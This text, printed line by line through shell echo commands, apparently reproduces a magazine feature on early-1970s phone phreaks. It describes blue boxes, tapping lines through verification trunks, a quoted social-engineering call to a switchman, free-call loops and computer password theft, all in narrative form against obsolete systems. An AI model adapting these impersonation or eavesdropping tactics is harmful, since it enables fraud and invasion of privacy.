echo "That's right," said the Captain. "I've also sent my voice around the world one way, going east on one phone, and going west on the other, 
echo going through cable one way, satellite the other, coming back together at the same time, ringing the two phones simultaneously and picking 
echo them up and whipping my voice both ways around the world back to me. Wow. That was a mind blower." "You mean you sit there with both 
echo phones on your ear and talk to yourself around the world," I said incredulously.
echo "Yeah. Um hum. That's what I do. I connect the phone together and sit there and talk."
echo "What do you say? What do you say to yourself when you're connected?"
echo "Oh, you know. Hello test one two three," he says in a low -pitched voice.
echo "Hello test one two three," he replied to himself in a high-pitched voice.
echo "Hello test one two three," he repeats again, low-pitched.
echo "Hello test one two three," he replies, high-pitched.
echo "I sometimes do this: Hello Hello Hello Hello, Hello, hello," he trails off and breaks into laughter.
echo Why Captain Crunch Hardly Ever Taps Phones Anymore
echo Using internal phone-company codes, phone phreaks have learned a simple method for tapping phones. Phone-company operators have in 
echo front of them a board that holds verification jacks. It allows them to plug into conversations in case of emergency, to listen in to a line to 
echo determine if the line is busy or the circuits are busy. Phone phreaks have learned to beep out the codes which lead them to a verification 
echo operator, tell the verification operator they are switchmen from some other area code testing out verification trunks. Once the operator hooks 
echo them into the verification trunk, they disappear into the board for all practical purposes, slip unnoticed into any one of the 10,000 to 100,000 
echo numbers in that central office without the verification operator knowing what they're doing, and of course without the two parties to the 
echo connection knowing there is a phantom listener present on their line.
echo Toward the end of my hour-long first conversation with him, I asked the Captain if he ever tapped phones.
echo "Oh no. I don't do that. I don't think it's right," he told me firmly. "I have the power to do it but I don't... Well one time, just one time, I have to admit 
echo that I did. There was this girl, Linda, and I wanted to find out... you know. I tried to call her up for a date. I had a date with her the last weekend 
echo and I thought she liked me. I called her up, man, and her line was busy, and I kept calling and it was still busy. Well, I had just learned about this 
echo system of jumping into lines and I said to myself, 'Hmmm. Why not just see if it works. It'll surprise her if all of a sudden I should pop up on her 
echo line. It'll impress her, if anything.' So I went ahead and did it. I M-Fed into the line. My M-F-er is powerful enough when patched directly into the 
echo mouthpiece to trigger a verification trunk without using an operator the way the other phone phreaks have to.
echo "I slipped into the line and there she was talking to another boyfriend. Making sweet talk to him. I didn't make a sound because I was so 
echo disgusted. So I waited there for her to hang up, listening to her making sweet talk to the other guy. You know. So as soon as she hung up I 
echo instantly M-F-ed her up and all I said was, 'Linda, we're through.' And I hung up. And it blew her head off. She couldn't figure out what the hell 
echo happened.
echo "But that was the only time. I did it thinking I would surprise her, impress her. Those were all my intentions were, and well, it really kind of hurt 
echo me pretty badly, and... and ever since then I don't go into verification trunks."
echo Moments later my first conversation with the Captain comes to a close.
echo "Listen," he says, his spirits somewhat cheered, "listen. What you are going to hear when I hang up is the sound of tandems unstacking. Layer 
echo after layer of tandems unstacking until there's nothing left of the stack, until it melts away into nothing. Cheep, cheep, cheep, cheep," he 
echo concludes, his voice descending to a whisper with each cheep.
echo He hangs up. The phone suddenly goes into four spasms: kachink cheep. Kachink cheep kachink cheep kachink cheep, and the complex 
echo connection has wiped itself out like the Cheshire cat's smile.
echo The MF Boogie Blues
echo The next number I choose from the select list of phone-phreak alumni, prepared for me by the blue-box inventor, is a Memphis number. It is the 
echo number of Joe Engressia, the first and still perhaps the most accomplished blind phone phreak.
echo Three years ago Engressia was a nine-day wonder in newspapers and magazines all over America because he had been discovered 
echo whistling free long-distance connections for fellow students at the University of South Florida.
echo Engressia was born with perfect pitch: he could whistle phone tones better than the phone-company's equipment.
echo Engressia might have gone on whistling in the dark for a few friends for the rest of his life if the phone company hadn't decided to expose him. 
echo He was warned, disciplined by the college, and the whole case became public. In the months following media reports of his talent, Engressia 
echo began receiving strange calls. There were calls from a group of kids in Los Angeles who could do some very strange things with the quirky 
echo General Telephone and Electronics circuitry in LA suburbs. There were calls from a group of mostly blind kids in ----, California, who had been 
echo doing some interesting experiments with Cap'n Crunch whistles and test loops. There was a group in Seattle, a group in Cambridge, 
echo Massachusetts, a few from New York, a few scattered across the country. Some of them had already equipped themselves with cassette 
echo and electronic M-F devices. For some of these groups, it was the first time they knew of the others.
echo The exposure of Engressia was the catalyst that linked the separate phone-phreak centers together. They all called Engressia. They talked to 
echo him about what he was doing and what they were doing. And then he told them -- the scattered regional centers and lonely independent 
echo phone phreakers -- about each other, gave them each other's numbers to call, and within a year the scattered phone-phreak centers had 
echo grown into a nationwide underground.
echo Joe Engressia is only twenty-two years old now, but along the phone-phreak network he is "the old man," accorded by phone phreaks 
echo something of the reverence the phone company bestows on Alexander Graham Bell. He seldom needs to make calls anymore. The phone 
echo phreaks all call him and let him know what new tricks, new codes, new techniques they have learned. Every night he sits like a sightless 
echo spider in his little apartment receiving messages from every tendril of his web. It is almost a point of pride with Joe that they call him.
echo But when I reached him in his Memphis apartment that night, Joe Engressia was lonely, jumpy and upset.
echo "God, I'm glad somebody called. I don't know why tonight of all nights I don't get any calls. This guy around here got drunk again tonight and 
echo propositioned me again. I keep telling him we'll never see eye to eye on this subject, if you know what I mean. I try to make light of it, you know, 
echo but he doesn't get it. I can head him out there getting drunker and I don't know what he'll do next. It's just that I'm really all alone here, just moved 
echo to Memphis, it's the first time I'm living on my own, and I'd hate for it to all collapse now. But I won't go to bed with him. I'm just not very 
echo interested in sex and even if I can't see him I know he's ugly.
echo "Did you hear that? That's him banging a bottle against the wall outside. He's nice. Well forget about it. You're doing a story on phone phreaks? 
echo Listen to this. It's the MF Boogie Blues.
echo Sure enough, a jumpy version of Muskrat Ramble boogies its way over the line, each note one of those long-distance phone tones. The music 
echo stops. A huge roaring voice blasts the phone off my ear: "AND THE QUESTION IS..." roars the voice, "CAN A BLIND PERSON HOOK UP AN 
echo AMPLIFIER ON HIS OWN?"
echo The roar ceases. A high-pitched operator-type voice replaces it. "This is Southern Braille Tel. and Tel. Have tone, will phone."
echo This is succeeded by a quick series of M-F tones, a swift "kachink" and a deep reassuring voice: "If you need home care, call the visitingnurses association. First National time in Honolulu is 4:32 p.m."
echo Joe back in his Joe voice again: "Are we seeing eye to eye? 'Si, si,' said the blind Mexican. Ahem. Yes. Would you like to know the weather in 
echo Tokyo?"
echo This swift manic sequence of phone-phreak vaudeville stunts and blind-boy jokes manages to keep Joe's mind off his tormentor only as long as 
echo it lasts.
echo "The reason I'm in Memphis, the reason I have to depend on that homosexual guy, is that this is the first time I've been able to live on my own 
echo and make phone trips on my own. I've been banned from all central offices around home in Florida, they knew me too well, and at the 
echo University some of my fellow scholars were always harassing me because I was on the dorm pay phone all the time and making fun of me 
echo because of my fat ass, which of course I do have, it's my physical fatness program, but I don't like to hear it every day, and if I can't phone trip 
echo and I can't phone phreak, I can't imagine what I'd do, I've been devoting three quarters of my life to it.
echo "I moved to Memphis because I wanted to be on my own as well as because it has a Number 5 crossbar switching system and some 
echo interesting little independent phone-company districts nearby and so far they don't seem to know who I am so I can go on phone tripping, and 
echo for me phone tripping is just as important as phone phreaking."
echo Phone tripping, Joe explains, begins with calling up a central-office switch room. He tells the switchman in a polite earnest voice that he's a 
echo blind college student interested in telephones, and could he perhaps have a guided tour of the switching station? Each step of the tour Joe likes 
echo to touch and feel relays, caress switching circuits, switchboards, crossbar arrangements.
echo So when Joe Engressia phone phreaks he feels his way through the circuitry of the country garden of forking paths, he feels switches shift, 
echo relays shunt, crossbars swivel, tandems engage and disengage even as he hears -- with perfect pitch -- his M-F pulses make the entire Bell 
echo system dance to his tune.
echo Just one month ago Joe took all his savings out of his bank and left home, over the emotional protests of his mother. "I ran away from home 
echo almost," he likes to say. Joe found a small apartment house on Union Avenue and began making phone trips. He'd take a bus a hundred miles 
echo south in Mississippi to see some old-fashioned Bell equipment still in use in several states, which had been puzzling. He'd take a bus three 
echo hundred miles to Charlotte, North Carolina, to look at some brand-new experimental equipment. He hired a taxi to drive him twelve miles to a 
echo suburb to tour the office of a small phone company with some interesting idiosyncrasies in its routing system. He was having the time of his 
echo life, he said, the most freedom and pleasure he had known.
echo In that month he had done very little long-distance phone phreaking from his own phone. He had begun to apply for a job with the phone 
echo company, he told me, and he wanted to stay away from anything illegal.
echo "Any kind of job will do, anything as menial as the most lowly operator. That's probably all they'd give me because I'm blind. Even though I 
echo probably know more than most switchmen. But that's okay. I want to work for Ma Bell. I don't hate Ma Bell the way Gilbertson and some phone 
echo phreaks do. I don't want to screw Ma Bell. With me it's the pleasure of pure knowledge. There's something beautiful about the system when 
echo you know it intimately the way I do. But I don't know how much they know about me here. I have a very intuitive feel for the condition of the 
echo line I'm on, and I think they're monitoring me off and on lately, but I haven't been doing much illegal. I have to make a few calls to switchmen 
echo once in a while which aren't strictly legal, and once I took an acid trip and was having these auditory hallucinations as if I were trapped and 
echo these planes were dive-bombing me, and all of sudden I had to phone phreak out of there. For some reason I had to call Kansas City, but that's 
echo all."
echo A Warning Is Delivered
echo At this point -- one o'clock in my time zone -- a loud knock on my motel-room door interrupts our conversation. Outside the door I find a 
echo uniformed security guard who informs me that there has been an "emergency phone call" for me while I have been on the line and that the 
echo front desk has sent him up to let me know.
echo Two seconds after I say good-bye to Joe and hang up, the phone rings.
echo "Who were you talking to?" the agitated voice demands. The voice belongs to Captain Crunch. "I called because I decided to warn you of 
echo something. I decided to warn you to be careful. I don't want this information you get to get to the radical underground. I don't want it to get into 
echo the wrong hands. What would you say if I told you it's possible for three phone phreaks to saturate the phone system of the nation. Saturate it. 
echo Busy it out. All of it. I know how to do this. I'm not gonna tell. A friend of mine has already saturated the trunks between Seattle and New York. 
echo He did it with a computerized M-F-er hitched into a special Manitoba exchange. But there are other, easier ways to do it."
echo Just three people? I ask. How is that possible?
echo "Have you ever heard of the long-lines guard frequency? Do you know about stacking tandems with 17 and 2600? Well, I'd advise you to find 
echo out about it. I'm not gonna tell you. But whatever you do, don't let this get into the hands of the radical underground."
echo (Later Gilbertson, the inventor, confessed that while he had always been skeptical about the Captain's claim of the sabotage potential of trunktying phone phreaks, he had recently heard certain demonstrations which convinced him the Captain was not speaking idly. "I think it might take 
echo more than three people, depending on how many machines like Captain Crunch's were available. But even though the Captain sounds a little 
echo weird, he generally turns out to know what he's talking about.")
echo "You know," Captain Crunch continues in his admonitory tone, "you know the younger phone phreaks call Moscow all the time. Suppose 
echo everybody were to call Moscow. I'm no right-winger. But I value my life. I don't want the Commies coming over and dropping a bomb on my 
echo head. That's why I say you've got to be careful about who gets this information."
echo The Captain suddenly shifts into a diatribe against those phone phreaks who don't like the phone company.
echo "They don't understand, but Ma Bell knows everything they do. Ma Bell knows. Listen, is this line hot? I just heard someone tap in. I'm not 
echo paranoid, but I can detect things like that. Well, even if it is, they know that I know that they know that I have a bulk eraser. I'm very clean." The 
echo Captain pauses, evidently torn between wanting to prove to the phone-company monitors that he does nothing illegal, and the desire to impress 
echo Ma Bell with his prowess. "Ma Bell knows how good I am. And I am quite good. I can detect reversals, tandem switching, everything that goes 
echo on a line. I have relative pitch now. Do you know what that means? My ears are a $20,000 piece of equipment. With my ears I can detect things 
echo they can't hear with their equipment. I've had employment problems. I've lost jobs. But I want to show Ma Bell how good I am. I don't want to 
echo screw her, I want to work for her. I want to do good for her. I want to help her get rid of her flaws and become perfect. That's my number-one 
echo goal in life now." The Captain concludes his warnings and tells me he has to be going. "I've got a little action lined up for tonight," he explains 
echo and hangs up.
echo Before I hang up for the night, I call Joe Engressia back. He reports that his tormentor has finally gone to sleep -- "He's not blind drunk, that's 
echo the way I get, ahem, yes; but you might say he's in a drunken stupor." I make a date to visit Joe in Memphis in two days.
echo A Phone Phreak Call Takes Care of Business
echo The next morning I attend a gathering of four phone phreaks in ----- (a California suburb). The gathering takes place in a comfortable split-level 
echo home in an upper-middle-class subdivision. Heaped on the kitchen table are the portable cassette recorders, M-F cassettes, phone patches, 
echo and line ties of the four phone phreaks present. On the kitchen counter next to the telephone is a shoe-box-size blue box with thirteen large 
echo toggle switches for the tones. The parents of the host phone phreak, Ralph, who is blind, stay in the living room with their sighted children. 
echo They are not sure exactly what Ralph and his friends do with the phone or if it's strictly legal, but he is blind and they are pleased he has a 
echo hobby which keeps him busy.
echo The group has been working at reestablishing the historic "2111" conference, reopening some toll-free loops, and trying to discover the 
echo dimensions of what seem to be new initiatives against phone phreaks by phone-company security agents.
echo It is not long before I get a chance to see, to hear, Randy at work. Randy is known among the phone phreaks as perhaps the finest con man in 
echo the game. Randy is blind. He is pale, soft and pear-shaped, he wears baggy pants and a wrinkly nylon white sport shirt, pushes his head 
echo forward from hunched shoulders somewhat like a turtle inching out of its shell. His eyes wander, crossing and recrossing, and his forehead is 
echo somewhat pimply. He is only sixteen years old.
echo But when Randy starts speaking into a telephone mouthpiece his voice becomes so stunningly authoritative it is necessary to look again to 
echo convince yourself it comes from a chubby adolescent Randy. Imagine the voice of a crack oil-rig foreman, a tough, sharp, weather-beaten 
echo Marlboro man of forty. Imagine the voice of a brilliant performance-fund gunslinger explaining how he beats the Dow Jones by thirty percent. 
echo Then imagine a voice that could make those two sound like Stepin Fetchit. That is sixteen-year-old Randy's voice.
echo He is speaking to a switchman in Detroit. The phone company in Detroit had closed up two toll-free loop pairs for no apparent reason, although 
echo heavy use by phone phreaks all over the country may have been detected. Randy is telling the switchman how to open up the loop and make it 
echo free again:
echo "How are you, buddy. Yeah. I'm on the board in here in Tulsa, Oklahoma, and we've been trying to run some tests on your loop-arounds and 
echo we find'em busied out on both sides.... Yeah, we've been getting a 'BY' on them, what d'ya say, can you drop cards on 'em? Do you have 08 
echo on your number group? Oh that's okay, we've had this trouble before, we may have to go after the circuit. Here lemme give 'em to you: your 
echo frame is 05, vertical group 03, horizontal 5, vertical file 3. Yeah, we'll hang on here.... Okay, found it? Good. Right, yeah, we'd like to clear that 
echo busy out. Right. All you have to do is look for your key on the mounting plate, it's in your miscellaneous trunk frame. Okay? Right. Now pull your 
echo key from NOR over the LCT. Yeah. I don't know why that happened, but we've been having trouble with that one. Okay. Thanks a lot fella. Be 
echo seein' ya."
echo Randy hangs up, reports that the switchman was a little inexperienced with the loop-around circuits on the miscellaneous trunk frame, but that 
echo the loop has been returned to its free-call status.
echo Delighted, phone phreak Ed returns the pair of numbers to the active-status column in his directory. Ed is a superb and painstaking researcher. 
echo With almost Talmudic thoroughness he will trace tendrils of hints through soft-wired mazes of intervening phone-company circuitry back 
echo through complex linkages of switching relays to find the location and identity of just one toll-free loop. He spends hours and hours, every day, 
echo doing this sort of thing. He has somehow compiled a directory of eight hundred "Band-six in-WATS numbers" located in over forty states. 
echo Band-six in-WATS numbers are the big 800 numbers -- the ones that can be dialed into free from anywhere in the country.
echo Ed the researcher, a nineteen-year-old engineering student, is also a superb technician. He put together his own working blue box from 
echo scratch at age seventeen. (He is sighted.) This evening after distributing the latest issue of his in-WATS directory (which has been typed into 
echo Braille for the blind phone phreaks), he announces he has made a major new breakthrough:
echo "I finally tested it and it works, perfectly. I've got this switching matrix which converts any touch-tone phone into an M-F-er."
echo The tones you hear in touch-tone phones are not the M-F tones that operate the long-distance switching system. Phone phreaks believe ATandT. 
echo had deliberately equipped touch tones with a different set of frequencies to avoid putting the six master M-F tones in the hands of every touchtone owner. Ed's complex switching matrix puts the six master tones, in effect put a blue box, in the hands of every touch-tone owner.
echo Ed shows me pages of schematics, specifications and parts lists. "It's not easy to build, but everything here is in the Heathkit catalog."
echo Ed asks Ralph what progress he has made in his attempts to reestablish a long-term open conference line for phone phreaks. The last big 
echo conference -- the historic "2111" conference -- had been arranged through an unused Telex test-board trunk somewhere in the innards of a 
echo 4A switching machine in Vancouver, Canada. For months phone phreaks could M-F their way into Vancouver, beep out 604 (the Vancouver 
echo area code) and then beep out 2111 (the internal phone-company code for Telex testing), and find themselves at any time, day or night, on an 
echo open wire talking with an array of phone phreaks from coast to coast, operators from Bermuda, Tokyo and London who are phone-phreak 
echo sympathizers, and miscellaneous guests and technical experts. The conference was a massive exchange of information. Phone phreaks 
echo picked each other's brains clean, then developed new ways to pick the phone company's brains clean. Ralph gave M F Boogies concerts with 
echo his home-entertainment-type electric organ, Captain Crunch demonstrated his round-the-w orld prowess with his notorious computerized unit 
echo and dropped leering hints of the "action" he was getting with his girl friends. (The Captain lives out or pretends to live out several kinds of 
echo fantasies to the gossipy delight of the blind phone phreaks who urge him on to further triumphs on behalf of all of them.) The somewhat rowdy 
echo Northwest phone-phreak crowd let their bitter internal feud spill over into the peaceable conference line, escalating shortly into guerrilla 
echo warfare; Carl the East Coast international tone relations expert demonstrated newly opened direct M-F routes to central offices on the island of 
echo Bahrein in the Persian Gulf, introduced a new phone-phreak friend of his in Pretoria, and explained the technical operation of the new Oaklandto Vietnam linkages. (Many phone phreaks pick up spending money by M-F-ing calls from relatives to Vietnam GIs charging $5 for a whole hour 
echo of trans-Pacific conversation.)
echo Day and night the conference line was never dead. Blind phone phreaks all over the country, lonely and isolated in homes filled with active 
echo sighted brothers and sisters, or trapped with slow and unimaginative blind kids in straitjacket schools for the blind, knew that no matter how 
echo late it got they could dial up the conference and find instant electronic communion with two or three other blind kids awake over on the other 
echo side of America. Talking together on a phone hookup, the blind phone phreaks say, is not much different from being there together. Physically, 
echo there was nothing more than a two-inch-square wafer of titanium inside a vast machine on Vancouver Island. For the blind kids >there< meant 
echo an exhilarating feeling of being in touch, through a kind of skill and magic which was peculiarly their own.
echo Last April 1, however, the long Vancouver Conference was shut off. The phone phreaks knew it was coming. Vancouver was in the process 
echo of converting from a step-by-step system to a 4A machine and the 2111 Telex circuit was to be wiped out in the process. The phone phreaks 
echo learned the actual day on which the conference would be erased about a week ahead of time over the phone company's internal-news-andshop-talk recording.
echo For the next frantic seven days every phone phreak in America was on and off the 2111 conference twenty-four hours a day. Phone phreaks 
echo who were just learning the game or didn't have M-F capability were boosted up to the conference by more experienced phreaks so they could 
echo get a glimpse of what it was like before it disappeared. Top phone phreaks searched distant area codes for new conference possibilities 
echo without success. Finally in the early morning of April 1, the end came.
echo "I could feel it coming a couple hours before midnight," Ralph remembers. "You could feel something going on in the lines. Some static began 
echo showing up, then some whistling wheezing sound. Then there were breaks. Some people got cut off and called right back in, but after a while 
echo some people were finding they were cut off and couldn't get back in at all. It was terrible. I lost it about one a.m., but managed to slip in again 
echo and stay on until the thing died... I think it was about four in the morning. There were four of us still hanging on when the conference 
echo disappeared into nowhere for good. We all tried to M-F up to it again of course, but we got silent termination. There was nothing there."
echo The Legendary Mark Bernay Turns Out To Be "The Midnight Skulker"
echo Mark Bernay. I had come across that name before. It was on Gilbertson's select list of phone phreaks. The California phone phreaks had 
echo spoken of a mysterious Mark Bernay as perhaps the first and oldest phone phreak on the West Coast. And in fact almost every phone phreak 
echo in the West can trace his origins either directly to Mark Bernay or to a disciple of Mark Bernay.
echo It seems that five years ago this Mark Bernay (a pseudonym he chose for himself) began traveling up and down the West Coast pasting tiny 
echo stickers in phone books all along his way. The stickers read something like "Want to hear an interesting tape recording? Call these numbers." 
echo The numbers that followed were toll-free loop-around pairs. When one of the curious called one of the numbers he would hear a tape 
echo recording pre-hooked into the loop by Bernay which explained the use of loop-around pairs, gave the numbers of several more, and ended by 
echo telling the caller, "At six o'clock tonight this recording will stop and you and your friends can try it out. Have fun."
echo "I was disappointed by the response at first," Bernay told me, when I finally reached him at one of his many numbers and he had dispensed 
echo with the usual "I never do anything illegal" formalities which experienced phone phreaks open most conversations.
echo "I went all over the coast with these stickers not only on pay phones, but I'd throw them in front of high schools in the middle of the night, I'd 
echo leave them unobtrusively in candy stores, scatter them on main streets of small towns. At first hardly anyone bothered to try it out. I would 
echo listen in for hours and hours after six o'clock and no one came on. I couldn't figure out why people wouldn't be interested. Finally these two 
echo girls in Oregon tried it out and told all their friends and suddenly it began to spread."
echo Before his Johny Appleseed trip Bernay had already gathered a sizable group of early pre-blue-box phone phreaks together on loop-arounds 
echo in Los Angeles. Bernay does not claim credit for the original discovery of the loop-around numbers. He attributes the discovery to an eighteenyear-old reform school kid in Long Beach whose name he forgets and who, he says, "just disappeared one day." When Bernay himself 
echo discovered loop-arounds independently, from clues in his readings in old issues of the Automatic Electric Technical Journal, he found dozens 
echo of the reform-school kid's friends already using them. However, it was one of Bernay's disciples in Seattle that introduced phone phreaking to 
echo blind kids. The Seattle kid who learned about loops through Bernay's recording told a blind friend, the blind kid taught the secret to his friends at 
echo a winter camp for blind kids in Los Angeles. When the camp session was over these kids took the secret back to towns all over the West. This 
echo is how the original blind kids became phone phreaks. For them, for most phone phreaks in general, it was the discovery of the possibilities of 
echo loop-arounds which led them on to far more serious and sophisticated phone-phreak methods, and which gave them a medium for sharing their 
echo discoveries.
echo A year later a blind kid who moved back east brought the technique to a blind kids' summer camp in Vermont, which spread it along the East 
echo Coast. All from a Mark Bernay sticker.
echo Bernay, who is nearly thirty years old now, got his start when he was fifteen and his family moved into an L.A. suburb serviced by General 
echo Telephone and Electronics equipment. He became fascinated with the differences between Bell and G.T.andE. equipment. He learned he could 
echo make interesting things happen by carefully timed clicks with the disengage button. He learned to interpret subtle differences in the array of 
echo clicks, whirrs and kachinks he could hear on his lines. He learned he could shift himself around the switching relays of the L.A. area code in a 
echo not-too-predictable fashion by interspersing his own hook-switch clicks with the clicks within the line. (Independent phone companies -- there 
echo are nineteen hundred of them still left, most of them tiny island principalities in Ma Bell's vast empire -- have always been favorites with phone 
echo phreaks, first as learning tools, then as Archimedes platforms from which to manipulate the huge Bell system. A phone phreak in Bell territory 
echo will often M-F himself into an independent's switching system, with switching idiosyncrasies which can give him marvelous leverage over the 
echo Bell System.
echo "I have a real affection for Automatic Electric Equipment," Bernay told me. "There are a lot of things you can play with. Things break down in 
echo interesting ways."
echo Shortly after Bernay graduated from college (with a double major in chemistry and philosophy), he graduated from phreaking around with 
echo G.T.andE. to the Bell System itself, and made his legendary sticker-pasting journey north along the coast, settling finally in Northwest Pacific Bell 
echo territory. He discovered that if Bell does not break down as interestingly as G.T.andE., it nevertheless offers a lot of "things to play with."
echo Bernay learned to play with blue boxes. He established his own personal switchboard and phone-phreak research laboratory complex. He 
echo continued his phone-phreak evangelism with ongoing sticker campaigns. He set up two recording numbers, one with instructions for beginning 
echo phone phreaks, the other with latest news and technical developments (along with some advanced instruction) gathered from sources all over 
echo the country.
echo These days, Bernay told me, he had gone beyond phone-phreaking itself. "Lately I've been enjoying playing with computers more than playing 
echo with phones. My personal thing in computers is just like with phones, I guess -- the kick is in finding out how to beat the system, how to get at 
echo things I'm not supposed to know about, how to do things with the system that I'm not supposed to be able to do."
echo As a matter of fact, Bernay told me, he had just been fired from his computer-programming job for doing things he was not supposed to be able 
echo to do. He had been working with a huge time-sharing computer owned by a large corporation but shared by many others. Access to the 
echo computer was limited to those programmers and corporations that had been assigned certain passwords. And each password restricted its 
echo user to access to only the one section of the computer cordoned off from its own information storager. The password system prevented 
echo companies and individuals from stealing each other's information.
echo "I figured out how to write a program that would let me read everyone else's password," Bernay reports. "I began playing around with 
echo passwords. I began letting the people who used the computer know, in subtle ways, that I knew their passwords. I began dropping notes to 
echo the computer supervisors with hints that I knew what I know. I signed them 'The Midnight Skulker.' I kept getting cleverer and cleverer with my 
echo messages and devising ways of showing them what I could do. I'm sure they couldn't imagine I could do the things I was showing them. But 
echo they never responded to me. Every once in a while they'd change the passwords, but I found out how to discover what the new ones were, 
echo and I let them know. But they never responded directly to the Midnight Skulker. I even finally designed a program which they could use to 
echo prevent my program from finding out what it did. In effect I told them how to wipe me out, The Midnight Skulker. It was a very clever program. I 
echo started leaving clues about myself. I wanted them to try and use it and then try to come up with something to get around that and reappear 
echo again. But they wouldn't play. I wanted to get caught. I mean I didn't want to get caught personally, but I wanted them to notice me and admit 
echo that they noticed me. I wanted them to attempt to respond, maybe in some interesting way." Finally the computer managers became concerned 
echo enough about the threat of information-stealing to respond. However, instead of using The Midnight Skulker's own elegant self-destruct 
echo program, they called in their security personnel, interrogated everyone, found an informer to identify Bernay as The Midnight Skulker, and fired 
echo him.
echo "At first the security people advised the company to hire me full-time to search out other flaws and discover other computer freaks. I might 
echo have liked that. But I probably would have turned into a double double agent rather than the double agent they wanted. I might have resurrected 
echo The Midnight Skulker and tried to catch myself. Who knows? Anyway, the higher-ups turned the whole idea down."
echo You Can Tap the F.B.I.'s Crime Control Computer in the Comfort of Your Own Home, Perhaps.
echo Computer freaking may be the wave of the future. It suits the phone-phreak sensibility perfectly. Gilbertson, the blue-box inventor and a lifelong 
echo phone phreak, has also gone on from phone-phreaking to computer-freaking. Before he got into the blue-box business Gilbertson, who is a 
echo highly skilled programmer, devised programs for international currency arbitrage.
echo But he began playing with computers in earnest when he learned he could use his blue box in tandem with the computer terminal installed in his 
echo apartment by the instrumentation firm he worked for. The print-out terminal and keyboard was equipped with acoustical coupling, so that by 
echo coupling his little ivory Princess phone to the terminal and then coupling his blue box on that, he could M-F his way into other computers with 
echo complete anonymity, and without charge; program and re-program them at will; feed them false or misleading information; tap and steal from 
echo them. He explained to me that he taps computers by busying out all the lines, then going into a verification trunk, listening into the passwords 
echo and instructions one of the time sharers uses, and them M-F-ing in and imitating them. He believes it would not be impossible to creep into the 
echo F.B.I's crime control computer through a local police computer terminal and phreak around with the F.B.I.'s memory banks. He claims he has 
echo succeeded in re-programming a certain huge institutional computer in such a way that it has cordoned off an entire section of its circuitry for 
echo his personal use, and at the same time conceals that arrangement from anyone else's notice. I have been unable to verify this claim.
echo Like Captain Crunch, like Alexander Graham Bell (pseudonym of a disgruntled-looking East Coast engineer who claims to have invented the 
echo black box and now sells black and blue boxes to gamblers and radical heavies), like most phone phreaks, Gilbertson began his career trying to 
echo rip off pay phones as a teenager. Figure them out, then rip them off. Getting his dime back from the pay phone is the phone phreak's first 
echo thrilling rite of passage. After learning the usual eighteen different ways of getting his dime back, Gilbertson learned how to make master keys 
echo to coin-phone cash boxes, and get everyone else's dimes back. He stole some phone-company equipment and put together his own home 
echo switchboard with it. He learned to make a simple "bread-box" device, of the kind used by bookies in the Thirties (bookie gives a number to his 
echo betting clients; the phone with that number is installed in some widow lady's apartment, but is rigged to ring in the bookie's shop across town, 
echo cops trace big betting number and find nothing but the widow).
echo Not long after that afternoon in 1968 when, deep in the stacks of an engineering library, he came across a technical journal with the phone 
echo tone frequencies and rushed off to make his first blue box, not long after that Gilbertson abandoned a very promising career in physical 
echo chemistry and began selling blue boxes for $1,500 apiece.
echo "I had to leave physical chemistry. I just ran out of interesting things to learn," he told me one evening. We had been talking in the apartment of 
echo the man who served as the link between Gilbertson and the syndicate in arranging the big $300,000 blue-box deal which fell through because 
echo of legal trouble. There has been some smoking.
echo "No more interesting things to learn," he continues. "Physical chemistry turns out to be a sick subject when you take it to its highest level. I don't 
echo know. I don't think I could explain to you how it's sick. You have to be there. But you get, I don't know, a false feeling of omnipotence. I suppose 
echo it's like phone-phreaking that way. This huge thing is there. This whole system. And there are holes in it and you slip into them like Alice and 
echo you're pretending you're doing something you're actually not, or at least it's no longer you that's doing what you thought you were doing. It's all 
echo Lewis Carroll. Physical chemistry and phone-phreaking. That's why you have these phone-phreak pseudonyms like The Cheshire Cat, the Red 
echo King, and The Snark. But there's something about phone-phreaking that you don't find in physical chemistry." He looks up at me:
echo "Did you ever steal anything?"
echo "Well yes, I..."
echo "Then you know You know the rush you get. It's not just knowledge, like physical chemistry. It's forbidden knowledge. You know. You can 
echo learn about anything under the sun and be bored to death with it. But the idea that it's illegal. Look: you can be small and mobile and smart and 
echo you're ripping off somebody large and powerful and very dangerous."
echo People like Gilbertson and Alexander Graham Bell are always talking about ripping off the phone company and screwing Ma Bell. But if they 
echo were shown a single button and told that by pushing it they could turn the entire circuitry of A.T.andT. into molten puddles, they probably wouldn't 
echo push it. The disgruntled-inventor phone phreak needs the phone system the way the lapsed Catholic needs the Church, the way Satan needs 
echo a God, the way The Midnight Skulker needed, more than anything else, response.
echo Later that evening Gilbertson finished telling me how delighted he was at the flood of blue boxes spreading throughout the country, how 
echo delighted he was to know that "this time they're really screwed." He suddenly shifted gears.
echo "Of course. I do have this love/hate thing about Ma Bell. In a way I almost like the phone company. I guess I'd be very sad if they were to 
echo disintegrate. In a way it's just that after having been so good they turn out to have these things wrong with them. It's those flaws that allow me 
echo to get in and mess with them, but I don't know. There's something about it that gets to you and makes you want to get to it, you know."
echo I ask him what happens when he runs out of interesting, forbidden things to learn about the phone system.
echo "I don't know, maybe I'd go to work for them for a while."
echo "In security even?"
echo "I'd do it, sure. I just as soon play -- I'd just as soon work on either side."
echo "Even figuring out how to trap phone phreaks? I said, recalling Mark Bernay's game."
echo "Yes, that might be interesting. Yes, I could figure out how to outwit the phone phreaks. Of course if I got too good at it, it might become boring 
echo again. Then I'd have to hope the phone phreaks got much better and outsmarted me for a while. That would move the quality of the game up 
echo one level. I might even have to help them out, you know, 'Well, kids, I wouldn't want this to get around but did you ever think of -- ?' I could keep 
echo it going at higher and higher levels forever."
echo The dealer speaks up for the first time. He has been staring at the soft blinking patterns of light and colors on the translucent tiled wall facing 
echo him. (Actually there are no patterns: the color and illumination of every tile is determined by a computerized random-number generator design ed 
echo by Gilbertson which insures that there can be no meaning to any sequence of events in the tiles.)
echo "Those are nice games you're talking about," says the dealer to his friend. "But I wouldn't mind seeing them screwed. A telephone isn't private 
echo anymore. You can't say anything you really want to say on a telephone or you have to go through that paranoid bullshit. 'Is it cool to talk on the 
echo phone?' I mean, even if it is cool, if you have to ask 'Is it cool,' then it isn't cool. You know. 'Is it cool,' then it isn't cool. You know. Like those 
echo blind kids, people are going to start putting together their own private telephone companies if they want to really talk. And you know what else. 
echo You don't hear silences on the phone anymore. They've got this time-sharing thing on long-distance lines where you make a pause and they 
echo snip out that piece of time and use it to carry part of somebody else's conversation.Instead of a pause, where somebody's maybe breathing or 
echo sighing, you get this blank hole and you only start hearing again when someone says a word and even the beginning of the word is clipped 
echo off. Silences don't count -- you're paying for them, but they take them away from you. It's not cool to talk and you can't hear someone when 
echo they don't talk. What the hell good is the phone? I wouldn't mind seeing them totally screwed."
